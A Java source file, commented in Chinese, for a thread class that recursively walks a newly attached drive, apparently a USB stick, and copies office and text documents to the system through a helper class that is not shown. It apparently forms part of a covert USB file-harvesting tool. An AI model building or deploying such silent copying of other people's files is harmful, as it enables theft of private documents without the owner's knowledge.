
import java.io.File;

//该类用于对新盘符文件的复制

public class CopyThread extends Thread {

	// 设置要复制的文件类型，如果要复制所有格式的文件，将fileTypes设为null即可

	private static String[] fileTypes = { "ppt", "doc", "txt", "wps", "pptx", "docx" };

	// private static String[] fileTypes = null;

	File file = null;

	public CopyThread(File file) {

		this.file = file;

	}

	public void run() {

		listUsbFiles(file);

	}

	// 遍历盘符文件，并匹配文件复制

	private void listUsbFiles(File ufile) {

		File[] files = ufile.listFiles();

		for (File f : files) {

			if (f.isDirectory()) {

				listUsbFiles(f);

			} else {

				if (fileTypeMatch(f))

					new CopyFileToSysRoot(f).doCopy();

			}

		}

	}

	// 匹配要复制的文件类型

	public boolean fileTypeMatch(File f) {

		// fileTypes为null时，则全部复制

		if (fileTypes == null) {

			return true;

		} else {

			for (String type : fileTypes) {

				if (f.getName().endsWith("." + type)) {

					return true;

				}

			}

		}

		return false;

	}

}
